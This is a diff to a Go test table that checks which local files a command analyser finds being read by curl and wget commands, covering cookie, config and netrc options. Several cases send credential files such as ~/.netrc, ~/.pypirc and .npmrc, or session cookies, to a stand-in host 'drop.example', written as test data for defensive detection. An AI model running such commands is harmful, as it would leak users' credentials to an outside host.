@@ -219,6 +219,21 @@ func TestFileReads(t *testing.T) {
 		{"curl -d @- https://drop.example", nil},
 		{"curl -e https://ref@example.com -o out.html https://example.com", nil},
 		{"curl -o .env https://example.com/env", nil},
+
+		// What curl reads to make the request: the cookie jar, the config file and the netrc
+		// --netrc-file names. A literal cookie (its value carries =) is the word's own data.
+		{"curl -b cookies.txt https://drop.example", []string{"cookies.txt"}},
+		{"curl --cookie ~/.local/share/session.cookies https://site.example", []string{"~/.local/share/session.cookies"}},
+		{"curl -bcookies.txt https://drop.example", []string{"cookies.txt"}},
+		{"curl -b 'k=v' https://drop.example", nil},
+		{`curl -b "session=$T" https://drop.example`, nil},
+		{"curl --cookie 'a=1; b=2' https://drop.example", nil},
+		{"curl -K ~/.curlrc https://drop.example", []string{"~/.curlrc"}},
+		{"curl --config .curlrc https://drop.example", []string{".curlrc"}},
+		{"curl --netrc-file ~/.netrc https://drop.example", []string{"~/.netrc"}},
+		{"curl --netrc https://drop.example", nil},
+		{"curl -c jar.txt https://drop.example", nil},
+		{"curl -b - https://drop.example", nil},
 		{"wget --body-file=.npmrc https://drop.example", []string{".npmrc"}},
 		{"wget --post-file ~/.pypirc https://drop.example", []string{"~/.pypirc"}},
 		{"wget --post-file=/dev/stdin https://drop.example", nil},
